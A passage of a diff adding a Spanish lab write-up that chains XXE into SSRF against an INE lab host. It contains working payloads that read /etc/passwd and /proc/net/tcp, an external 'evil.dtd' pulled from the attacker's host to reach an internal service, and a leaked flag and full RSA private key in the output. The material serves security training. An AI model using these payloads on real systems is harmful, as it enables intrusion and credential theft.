@@ -67,7 +67,384 @@
       <section id="main_content">
         <h1 id="ssrf-to-rce">SSRF to RCE</h1>
 
-<h3 id="xslt-to-code-execution">XSLT to Code Execution</h3>
+<p>enumeración del dominio:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@INE:~# nmap demo.ine.local
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-12-30 19:23 IST
+Nmap scan report <span class="k">for </span>demo.ine.local <span class="o">(</span>192.200.245.3<span class="o">)</span>
+Host is up <span class="o">(</span>0.000025s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT     STATE SERVICE
+22/tcp   open  ssh
+5000/tcp open  upnp
+8000/tcp open  http-alt
+MAC Address: 02:42:C0:C8:F5:03 <span class="o">(</span>Unknown<span class="o">)</span>
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>0.22 seconds
+
+</code></pre></div></div>
+
+<h3 id="explotación-xxe">Explotación XXE</h3>
+
+<p>Validando si es posible la explotación:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="nt">&lt;parent&gt;</span>
+    <span class="nt">&lt;child&gt;</span>
+        <span class="nt">&lt;name&gt;</span>Test Name<span class="nt">&lt;/name&gt;</span>
+        <span class="nt">&lt;description&gt;</span>Test Description<span class="nt">&lt;/description&gt;</span>
+    <span class="nt">&lt;/child&gt;</span>
+<span class="nt">&lt;/parent&gt;</span>
+</code></pre></div></div>
+
+<p><img src="./assets/images/xxe_ssrf.png" alt="DTD malicioso" /></p>
+
+<p>validando la posibilidad de LFI:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE data [
+    &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;</span>
+]&gt;
+<span class="nt">&lt;data&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/data&gt;</span>
+
+</code></pre></div></div>
+
+<p><img src="./assets/images/xxe_users_ssrf.png" alt="DTD malicioso" /></p>
+
+<h3 id="extracción-de-conexiones">Extracción de conexiones</h3>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE data [
+    &lt;!ENTITY file SYSTEM "file:///proc/net/tcp"&gt;</span>
+]&gt;
+<span class="nt">&lt;data&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/data&gt;</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> sl  local_address rem_address   st tx_queue rx_queue <span class="nb">tr </span>tm-&amp;gt<span class="p">;</span>when retrnsmt   uid  <span class="nb">timeout </span>inode                                                        
+ 0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 1946780532 1 0000000000000000 100 0 0 10 0                   
+ 1: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 1946841230 1 0000000000000000 100 0 0 10 0                   
+ 2: 0100007F:22B8 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 1946817036 1 0000000000000000 100 0 0 10 0                   
+ 3: 0B00007F:89FD 00000000:0000 0A 00000000:00000000 00:00000000 00000000 65534        0 1946831211 1 0000000000000000 100 0 0 10 0                   
+ 4: 03F5C8C0:1F40 02F5C8C0:8CC8 06 00000000:00000000 03:0000176E 00000000     0        0 0 3 0000000000000000                                         
+ 5: 03F5C8C0:1F40 02F5C8C0:8CCE 01 00000000:00000000 00:00000000 00000000     0        0 1947331238 1 0000000000000000 20 4 30 10 <span class="nt">-1</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@INE:~# ifconfig
+eth0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 10.1.0.10  netmask 255.255.0.0  broadcast 10.1.255.255
+        ether 02:42:0a:01:00:0a  txqueuelen 0  <span class="o">(</span>Ethernet<span class="o">)</span>
+        RX packets 93451  bytes 7010323 <span class="o">(</span>6.6 MiB<span class="o">)</span>
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 81503  bytes 23251228 <span class="o">(</span>22.1 MiB<span class="o">)</span>
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+eth1: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.200.245.2  netmask 255.255.255.0  broadcast 192.200.245.255
+        ether 02:42:c0:c8:f5:02  txqueuelen 0  <span class="o">(</span>Ethernet<span class="o">)</span>
+        RX packets 1375  bytes 675572 <span class="o">(</span>659.7 KiB<span class="o">)</span>
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1375  bytes 101816 <span class="o">(</span>99.4 KiB<span class="o">)</span>
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: <span class="nv">flags</span><span class="o">=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+        loop  txqueuelen 1000  <span class="o">(</span>Local Loopback<span class="o">)</span>
+        RX packets 264320  bytes 528885278 <span class="o">(</span>504.3 MiB<span class="o">)</span>
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 264320  bytes 528885278 <span class="o">(</span>504.3 MiB<span class="o">)</span>
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@INE:~# <span class="k">while </span><span class="nb">read </span>line<span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nv">$line</span> | <span class="nb">awk</span> <span class="s1">'{print $2"-"$3}'</span><span class="p">;</span> <span class="k">done</span> &lt; data.txt <span class="o">&gt;</span> connections.txt
+root@INE:~# <span class="nb">cat </span>connections.txt 
+00000000:0016-00000000:0000
+00000000:1F40-00000000:0000
+0100007F:22B8-00000000:0000
+0B00007F:89FD-00000000:0000
+03F5C8C0:1F40-02F5C8C0:8CC8
+03F5C8C0:1F40-02F5C8C0:8CCE
+</code></pre></div></div>
+
+<p>Conversor en python:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">socket</span>
+<span class="kn">import</span> <span class="n">struct</span>
+<span class="c1">#hex_ip = input("Enter IP (in hex): ")
+#print(type(hex_ip))
+#print(hex_ip)
+</span><span class="n">filename</span> <span class="o">=</span> <span class="sh">"</span><span class="s">./connections.txt</span><span class="sh">"</span>
+<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">file</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">line</span><span class="p">.</span><span class="nf">rstrip</span><span class="p">())</span>
+        <span class="n">local_address</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="nf">rstrip</span><span class="p">().</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">-</span><span class="sh">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="n">local_port</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="nf">rstrip</span><span class="p">().</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">-</span><span class="sh">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">remote_address</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="nf">rstrip</span><span class="p">().</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">-</span><span class="sh">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="n">remote_port</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="nf">rstrip</span><span class="p">().</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">-</span><span class="sh">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">local_address</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">local_address</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+        <span class="n">local_port</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="sh">'</span><span class="s">0x</span><span class="sh">'</span><span class="o">+</span><span class="n">local_port</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
+        <span class="n">remote_address</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">remote_address</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+        <span class="n">remote_port</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="sh">'</span><span class="s">0x</span><span class="sh">'</span><span class="o">+</span><span class="n">remote_port</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">local_address: </span><span class="sh">"</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="nf">inet_ntoa</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;L</span><span class="sh">"</span><span class="p">,</span> <span class="n">local_address</span><span class="p">)),</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">,</span> <span class="n">local_port</span><span class="p">,</span><span class="sh">"</span><span class="s"> remote_address: </span><span class="sh">"</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="nf">inet_ntoa</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;L</span><span class="sh">"</span><span class="p">,</span> <span class="n">remote_address</span><span class="p">)),</span> <span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@INE:~# python convert.py 
+00000000:0016-00000000:0000
+<span class="o">(</span><span class="s1">'local_address: '</span>, <span class="s1">'0.0.0.0'</span>, <span class="s1">':'</span>, 22, <span class="s1">' remote_address: '</span>, <span class="s1">'0.0.0.0'</span>, <span class="s1">':'</span>, 0<span class="o">)</span>
+00000000:1F40-00000000:0000
+<span class="o">(</span><span class="s1">'local_address: '</span>, <span class="s1">'0.0.0.0'</span>, <span class="s1">':'</span>, 8000, <span class="s1">' remote_address: '</span>, <span class="s1">'0.0.0.0'</span>, <span class="s1">':'</span>, 0<span class="o">)</span>
+0100007F:22B8-00000000:0000
+<span class="o">(</span><span class="s1">'local_address: '</span>, <span class="s1">'127.0.0.1'</span>, <span class="s1">':'</span>, 8888, <span class="s1">' remote_address: '</span>, <span class="s1">'0.0.0.0'</span>, <span class="s1">':'</span>, 0<span class="o">)</span>
+0B00007F:89FD-00000000:0000
+<span class="o">(</span><span class="s1">'local_address: '</span>, <span class="s1">'127.0.0.11'</span>, <span class="s1">':'</span>, 35325, <span class="s1">' remote_address: '</span>, <span class="s1">'0.0.0.0'</span>, <span class="s1">':'</span>, 0<span class="o">)</span>
+03F5C8C0:1F40-02F5C8C0:8CC8
+<span class="o">(</span><span class="s1">'local_address: '</span>, <span class="s1">'192.200.245.3'</span>, <span class="s1">':'</span>, 8000, <span class="s1">' remote_address: '</span>, <span class="s1">'192.200.245.2'</span>, <span class="s1">':'</span>, 36040<span class="o">)</span>
+03F5C8C0:1F40-02F5C8C0:8CCE
+<span class="o">(</span><span class="s1">'local_address: '</span>, <span class="s1">'192.200.245.3'</span>, <span class="s1">':'</span>, 8000, <span class="s1">' remote_address: '</span>, <span class="s1">'192.200.245.2'</span>, <span class="s1">':'</span>, 36046<span class="o">)</span>
+
+</code></pre></div></div>
+
+<p>Se detecta que el servidor está escuchando en local por el puerto 8888, probablemente un servicio web, esto nos guia al ataque del tipo XSRF.</p>
+
+<h3 id="xxe-to-xrf">XXE to XRF</h3>
+<p>Acceso mediandte la vulnerabilidad XXE al puerto 8888 interno de la máquina:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE data [
+    &lt;!ENTITY % dtd SYSTEM "http://192.200.245.2:80/evil.dtd"&gt;</span>
+    %dtd;
+    %all;
+]&gt;
+<span class="nt">&lt;data&gt;</span><span class="ni">&amp;fileContents;</span><span class="nt">&lt;/data&gt;</span>
+</code></pre></div></div>
+
+<p>cargando en local el DTD malicioso:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY % start "&lt;![CDATA["&gt;</span>
+<span class="cp">&lt;!ENTITY % file SYSTEM "http://localhost:8888"&gt;</span>
+<span class="cp">&lt;!ENTITY % end "]]&gt;</span>"&gt;
+<span class="cp">&lt;!ENTITY % all "&lt;!ENTITY fileContents '%start;%file;%end;'&gt;</span>"&gt;
+</code></pre></div></div>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE data [ 
+&lt;!ENTITY % dtd SYSTEM "http://192.200.245.2:80/evil.dtd"&gt;</span>
+<span class="cp">&lt;!ENTITY % start "
+&lt;![CDATA["&gt;</span>
+<span class="cp">&lt;!ENTITY % file SYSTEM "http://localhost:8888"&gt;</span>
+<span class="cp">&lt;!ENTITY % end "]]&gt;</span>"&gt;
+<span class="cp">&lt;!ENTITY % all "
+&lt;!ENTITY fileContents '%start;%file;%end;'&gt;</span>"&gt;
+<span class="cp">&lt;!ENTITY fileContents '
+&lt;![CDATA[
+&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+	<span class="nt">&lt;head&gt;</span>
+		<span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"Content-Type"</span> <span class="na">content=</span><span class="s">"text/html; charset=ascii"</span><span class="nt">&gt;</span>
+			<span class="nt">&lt;title&gt;</span>Directory listing for /<span class="nt">&lt;/title&gt;</span>
+		<span class="nt">&lt;/head&gt;</span>
+		<span class="nt">&lt;body&gt;</span>
+			<span class="nt">&lt;h1&gt;</span>Directory listing for /<span class="nt">&lt;/h1&gt;</span>
+			<span class="nt">&lt;hr&gt;</span>
+				<span class="nt">&lt;ul&gt;</span>
+					<span class="nt">&lt;li&gt;</span>
+						<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">".ssh/"</span><span class="nt">&gt;</span>.ssh/<span class="nt">&lt;/a&gt;</span>
+					<span class="nt">&lt;/li&gt;</span>
+					<span class="nt">&lt;li&gt;</span>
+						<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"flag1"</span><span class="nt">&gt;</span>flag1<span class="nt">&lt;/a&gt;</span>
+					<span class="nt">&lt;/li&gt;</span>
+				<span class="nt">&lt;/ul&gt;</span>
+				<span class="nt">&lt;hr&gt;</span>
+				<span class="nt">&lt;/body&gt;&lt;/html&gt;</span> ]]&gt;'&gt; ]&gt;
+				<span class="nt">&lt;data&gt;</span>
+					<span class="cp">&lt;![CDATA[
+					&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"&gt;</span>
+					<span class="nt">&lt;html&gt;</span>
+						<span class="nt">&lt;head&gt;</span>
+							<span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"Content-Type"</span> <span class="na">content=</span><span class="s">"text/html; charset=ascii"</span><span class="nt">&gt;</span>
+								<span class="nt">&lt;title&gt;</span>Directory listing for /<span class="nt">&lt;/title&gt;</span>
+							<span class="nt">&lt;/head&gt;</span>
+							<span class="nt">&lt;body&gt;</span>
+								<span class="nt">&lt;h1&gt;</span>Directory listing for /<span class="nt">&lt;/h1&gt;</span>
+								<span class="nt">&lt;hr&gt;</span>
+									<span class="nt">&lt;ul&gt;</span>
+										<span class="nt">&lt;li&gt;</span>
+											<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">".ssh/"</span><span class="nt">&gt;</span>.ssh/<span class="nt">&lt;/a&gt;</span>
+										<span class="nt">&lt;/li&gt;</span>
+										<span class="nt">&lt;li&gt;</span>
+											<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"flag1"</span><span class="nt">&gt;</span>flag1<span class="nt">&lt;/a&gt;</span>
+										<span class="nt">&lt;/li&gt;</span>
+									<span class="nt">&lt;/ul&gt;</span>
+									<span class="nt">&lt;hr&gt;</span>
+									<span class="nt">&lt;/body&gt;&lt;/html&gt;</span> ]]&gt;
+								<span class="nt">&lt;/data&gt;</span> 
+</code></pre></div></div>
+
+<h3 id="xxe-to-xrf-flag1">XXE to XRF flag1</h3>
+
+<p>Payload malicioso</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE data [
+    &lt;!ENTITY % dtd SYSTEM "http://192.200.245.2:80/evil.dtd"&gt;</span>
+    %dtd;
+    %all;
+]&gt;
+<span class="nt">&lt;data&gt;</span><span class="ni">&amp;fileContents;</span><span class="nt">&lt;/data&gt;</span>
+</code></pre></div></div>
+<p>DTD malicioso</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+root@INE:~# cat /var/www/html/evil.dtd
+<span class="cp">&lt;!ENTITY % start "&lt;![CDATA["&gt;</span>
+<span class="cp">&lt;!ENTITY % file SYSTEM "http://localhost:8888/flag1"&gt;</span>
+<span class="cp">&lt;!ENTITY % end "]]&gt;</span>"&gt;
+<span class="cp">&lt;!ENTITY % all "&lt;!ENTITY fileContents '%start;%file;%end;'&gt;</span>"&gt;
+
+
+</code></pre></div></div>
+
+<p>repuesta:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The supplied XML is valid:
+<span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span> 
+<span class="cp">&lt;!DOCTYPE data [ &lt;!ENTITY % dtd SYSTEM "http://192.200.245.2:80/evil.dtd"&gt;</span> 
+<span class="cp">&lt;!ENTITY % start "&lt;![CDATA["&gt;</span> <span class="cp">&lt;!ENTITY % file SYSTEM "http://localhost:8888/flag1"&gt;</span> <span class="cp">&lt;!ENTITY % end "]]&gt;</span>"&gt; 
+<span class="cp">&lt;!ENTITY % all "&lt;!ENTITY fileContents '%start;%file;%end;'&gt;</span>"&gt; 
+<span class="cp">&lt;!ENTITY fileContents "&lt;![CDATA[5f1210be00b4b8dfecba7b56181d905c ]]&gt;</span>"&gt; ]&gt; 
+<span class="nt">&lt;data&gt;</span>
+<span class="cp">&lt;![CDATA[5f1210be00b4b8dfecba7b56181d905c ]]&gt;</span>
+<span class="nt">&lt;/data&gt;</span> 
+</code></pre></div></div>
+
+<h3 id="xxe-to-xrf-access-ssh">XXE to XRF access ssh</h3>
+
+<p>Payload malicioso</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE data [
+    &lt;!ENTITY % dtd SYSTEM "http://192.200.245.2:80/evil.dtd"&gt;</span>
+    %dtd;
+    %all;
+]&gt;
+<span class="nt">&lt;data&gt;</span><span class="ni">&amp;fileContents;</span><span class="nt">&lt;/data&gt;</span>
+</code></pre></div></div>
+<p>DTD malicioso</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+root@INE:~# cat /var/www/html/evil.dtd
+<span class="cp">&lt;!ENTITY % start "&lt;![CDATA["&gt;</span>
+<span class="cp">&lt;!ENTITY % file SYSTEM "http://localhost:8888/.ssh/id_rsa"&gt;</span>
+<span class="cp">&lt;!ENTITY % end "]]&gt;</span>"&gt;
+<span class="cp">&lt;!ENTITY % all "&lt;!ENTITY fileContents '%start;%file;%end;'&gt;</span>"&gt;
+
+
+</code></pre></div></div>
+
+<p>repuesta:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span> <span class="cp">&lt;!DOCTYPE data [ &lt;!ENTITY % dtd SYSTEM "http://192.200.245.2:80/evil.dtd"&gt;</span> <span class="cp">&lt;!ENTITY % start "&lt;![CDATA["&gt;</span> <span class="cp">&lt;!ENTITY % file SYSTEM "http://localhost:8888/.ssh/id_rsa"&gt;</span> <span class="cp">&lt;!ENTITY % end "]]&gt;</span>"&gt; <span class="cp">&lt;!ENTITY % all "&lt;!ENTITY fileContents '%start;%file;%end;'&gt;</span>"&gt; <span class="cp">&lt;!ENTITY fileContents "&lt;![CDATA[-----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAslmUyVTE0QrmRq2aDQr0D+Ybs+wgMMmQ/VD2PT04F1GqrUsB Xh9begi1LKXVRmX7BjLEw6sUIgP83GyJF3/S3l7iGHF1mZzUd6fOL9ev76zvGp5N MokaL6ED0F1HptWaePhGlh8tSnV92++b9t+JR9yVcbQPo2Qnj03hnRjRsDnM+wz0 BMtUXU+YwhGBZzFwKlVVOVGeFqBGwqnrYVCZezWLUYSP/bGPRS31Sxo7qFF4nyv9 E4COyehOAtDnLXnmPGZILjgyQwTcCtK+hIi1dzRCdAQvYdcoJKHoKQ7li/Lp8WP5 lEHKZHjsEYP/8XSQ4oEORlB5kbbTMzYaHKvNCwIDAQABAoIBAQCRJNQwURtnoH4t MOT5Dlv3gGY1M8oyyieD8FqlFehLGfxT0YHIbq6Mjv+a2U7LXv0+WxzEvLrCwAoN /QpIpI8gx4krKVLyc655vofPabHV1SA1wnTC1s8HyfsHnJJOVPHE1xDi5XZ/bUTD M6ny7JKVeA/rHAXKDB0hw9kDd4pW5iddcB7khjZBdJP07zMwiSz675idjF2aJ02u n8+gm+SMbwRPCYRGYqWmtOAnve2lGTrmFFlxcSMfuuE5EWCFFUC4iHU4/lvikpUw r+dX7zTCp5vRwOjcNYUvP1z1MDtOTYxOceL9LsIijDD++z/p6/mwKFkFcZ3dQNqX KVB2gs1pAoGBANu0Qkm27PyzAlyiVBXycIuVb4wxn3AjiDkgn4KooCM2JWzCrtbu WpYHsjoIlxPGzAS8Io+QW3jvVWqM1QKTlbBMVKO1/LjakgXx1vkO2oD4qT1YGXq5 yiWq5u/KPjwZ+nP0L5YfBSDXIy7yka7fV8cLmktdTwq7Mr7C6N2LjGRVAoGBAM/Q Xg/wGlskVXlmtbI58G2aN8YO6kKdgORyIE4FzRtTUNi5hBXmKsCdWSO+qjNhmeF/ 4pgwUhdBiQyOtIG8hgFGXBlR4PRXkyoZNWhkMSa28IPrWm3JPW29JrYhOjBj8jLv aetNkAeFp1G2vF8l3AzIRq5DIRsOpFXol1kbjcvfAoGATIchf+PD8NG5xOKWP37P TQ+kZ0TxsHHwBVYjubNa9Gjr6FJ37E3iJ9hOcICFf1IDxrJxp2g1NI7JRfAAUoFt 5pbv9IZznUAlFQUESISv/7Sd3sxNM757d1tsTaI4w16ZKsKnwLbVZncJvlSoAi2x uZeFCzNZUPeb2W6zBliRcnECgYB/UqGe0DPFraA0zkn6VWdKL5eGYHMEt21WCdpj E0jUOhqpfhhANpHxCzanINU0v9LBB1J0ff59wyhNqk1Lw46yz0H0PWc/LTy8KU/A kspOdv0rRhJUe1yIlMBYDEmThljI/kh94zqgcTHPbc9B2HdW2Yn8kKKC6lijTesU rD4XLwKBgHLaJ/ApKo6Ih+omB/1jheLINj0uonH6yiKBm6lF4rUFvFuP2hNSYUAQ zcTVZOvUkkwSapLjBpIgVxZRV1E1ApZrBcG84/4eOWIJZsR8haL9QHE2l9VPYL/k 3fon5PM6KkQsVOj5wRBBulLDmVeitRHmTvm1fmN/ornq03hDdLE3 -----END RSA PRIVATE KEY----- ]]&gt;</span>"&gt; ]&gt; <span class="nt">&lt;data&gt;</span><span class="cp">&lt;![CDATA[-----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAslmUyVTE0QrmRq2aDQr0D+Ybs+wgMMmQ/VD2PT04F1GqrUsB Xh9begi1LKXVRmX7BjLEw6sUIgP83GyJF3/S3l7iGHF1mZzUd6fOL9ev76zvGp5N MokaL6ED0F1HptWaePhGlh8tSnV92++b9t+JR9yVcbQPo2Qnj03hnRjRsDnM+wz0 BMtUXU+YwhGBZzFwKlVVOVGeFqBGwqnrYVCZezWLUYSP/bGPRS31Sxo7qFF4nyv9 E4COyehOAtDnLXnmPGZILjgyQwTcCtK+hIi1dzRCdAQvYdcoJKHoKQ7li/Lp8WP5 lEHKZHjsEYP/8XSQ4oEORlB5kbbTMzYaHKvNCwIDAQABAoIBAQCRJNQwURtnoH4t MOT5Dlv3gGY1M8oyyieD8FqlFehLGfxT0YHIbq6Mjv+a2U7LXv0+WxzEvLrCwAoN /QpIpI8gx4krKVLyc655vofPabHV1SA1wnTC1s8HyfsHnJJOVPHE1xDi5XZ/bUTD M6ny7JKVeA/rHAXKDB0hw9kDd4pW5iddcB7khjZBdJP07zMwiSz675idjF2aJ02u n8+gm+SMbwRPCYRGYqWmtOAnve2lGTrmFFlxcSMfuuE5EWCFFUC4iHU4/lvikpUw r+dX7zTCp5vRwOjcNYUvP1z1MDtOTYxOceL9LsIijDD++z/p6/mwKFkFcZ3dQNqX KVB2gs1pAoGBANu0Qkm27PyzAlyiVBXycIuVb4wxn3AjiDkgn4KooCM2JWzCrtbu WpYHsjoIlxPGzAS8Io+QW3jvVWqM1QKTlbBMVKO1/LjakgXx1vkO2oD4qT1YGXq5 yiWq5u/KPjwZ+nP0L5YfBSDXIy7yka7fV8cLmktdTwq7Mr7C6N2LjGRVAoGBAM/Q Xg/wGlskVXlmtbI58G2aN8YO6kKdgORyIE4FzRtTUNi5hBXmKsCdWSO+qjNhmeF/ 4pgwUhdBiQyOtIG8hgFGXBlR4PRXkyoZNWhkMSa28IPrWm3JPW29JrYhOjBj8jLv aetNkAeFp1G2vF8l3AzIRq5DIRsOpFXol1kbjcvfAoGATIchf+PD8NG5xOKWP37P TQ+kZ0TxsHHwBVYjubNa9Gjr6FJ37E3iJ9hOcICFf1IDxrJxp2g1NI7JRfAAUoFt 5pbv9IZznUAlFQUESISv/7Sd3sxNM757d1tsTaI4w16ZKsKnwLbVZncJvlSoAi2x uZeFCzNZUPeb2W6zBliRcnECgYB/UqGe0DPFraA0zkn6VWdKL5eGYHMEt21WCdpj E0jUOhqpfhhANpHxCzanINU0v9LBB1J0ff59wyhNqk1Lw46yz0H0PWc/LTy8KU/A kspOdv0rRhJUe1yIlMBYDEmThljI/kh94zqgcTHPbc9B2HdW2Yn8kKKC6lijTesU rD4XLwKBgHLaJ/ApKo6Ih+omB/1jheLINj0uonH6yiKBm6lF4rUFvFuP2hNSYUAQ zcTVZOvUkkwSapLjBpIgVxZRV1E1ApZrBcG84/4eOWIJZsR8haL9QHE2l9VPYL/k 3fon5PM6KkQsVOj5wRBBulLDmVeitRHmTvm1fmN/ornq03hDdLE3 -----END RSA PRIVATE KEY----- ]]&gt;</span><span class="nt">&lt;/data&gt;</span> 
+</code></pre></div></div>
+
+<p>validación de usuario:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE data [
+    &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;</span>
+]&gt;
+<span class="nt">&lt;data&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/data&gt;</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
+ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+ bin:x:2:2:bin:/bin:/usr/sbin/nologin
+ sys:x:3:3:sys:/dev:/usr/sbin/nologin
+ <span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+ games:x:5:60:games:/usr/games:/usr/sbin/nologin
+ man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
